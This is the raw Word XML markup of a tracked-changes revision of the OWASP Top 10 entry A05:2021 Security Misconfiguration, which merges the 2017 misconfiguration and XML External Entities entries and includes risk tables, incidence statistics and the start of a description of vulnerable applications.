        <w:t>id:      "A05:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC52054"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78762256"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671025C4"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#A05:2021 – Security Misconfiguration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[icon](assets/TOP_10_Icons_Final_Security_Misconfiguration.png){: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id=id, name="Security Misconfiguration", lang=lang, source=source, parent=parent, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>merged_from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.4", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.6"]) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7185B906" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57184C37" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1787" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1788" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A6:2017 Security Misconfiguration</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5A30C700"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89" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C4F2FDB"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90" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1791" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="24EBAAC5"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92" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1793" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0003029D"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94" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1795" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0E87F99C"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96" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1797" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>| Attackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc to gain unauthorized access or knowledge of the system. | Security misconfiguration can happen at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options, etc. | Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of the application and data. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="117F8E79"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798" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32181FCE" w14:textId="65896D1E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1799" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1800" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"># A4:2017 </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6288E8CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1801" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1802" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39578E1C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1803" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EF3A442" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1804" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1805"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13F15AE3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1806" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1807" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D3860F3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1808" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1809" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 20          | 19.84%             | 4.51%              | 8.12                 | 6.56                | 89.58%       | 44.84%       | 208,387           | 789        |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="66EC23BD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1810" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C240538" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1811" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1812" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5CE8FCF9" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1813" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="713DCF2B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1814" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1815" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Moving up from #6 in the previous edition, 90% of applications were</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6B41A858" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1816" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1817" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">tested for some form of misconfiguration, with an average incidence rate of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>4.%</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>, and over 208k occurrences of a Common Weakness Enumeration (CWE) in this risk category. With more shifts into highly configurable software, it's not surprising to see this category move up.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="50E41E65" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1818" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1819" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Notable CWEs included are *CWE-16 Configuration* and *CWE-611 Improper</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5A6EEE38" w14:textId="642C0016" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1820" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Restriction of </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">XML External </w:t>
      </w:r>
      <w:del w:id="1821" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Entities (XXE)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1822" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Entity Reference*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="070C289B" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="1823" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1824" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="787E8943" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="1825" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1826" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2964D012" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="1827" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1828" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 2 | Prevalence 2 : Detectability 3 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1B8EF86A" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="1829" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1830" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">| Attackers can exploit vulnerable XML processors if they can upload XML or include hostile content in an XML document, exploiting vulnerable code, dependencies or integrations. | By default, many older XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. [SAST](https://www.owasp.org/index.php/Source_Code_Analysis_Tools) tools can discover this issue by inspecting dependencies and configuration. [DAST](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools) tools require additional manual steps to detect and exploit this issue. Manual testers need to be trained in how to test for XXE, as it not commonly tested as of 2017. | These flaws can be used to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. </w:delText>
        </w:r>
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>|</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="56DCC4FC"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31" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E7DE683"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32" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F01302A"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33" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1834" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6CB5B8E7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1283589A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EAC7F6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71061529" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The application might be vulnerable if the application is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1166BC36" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D4F0FE7" w14:textId="1F5C987B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Missing appropriate security hardening across any part of the</w:t>
      </w:r>
    </w:p>
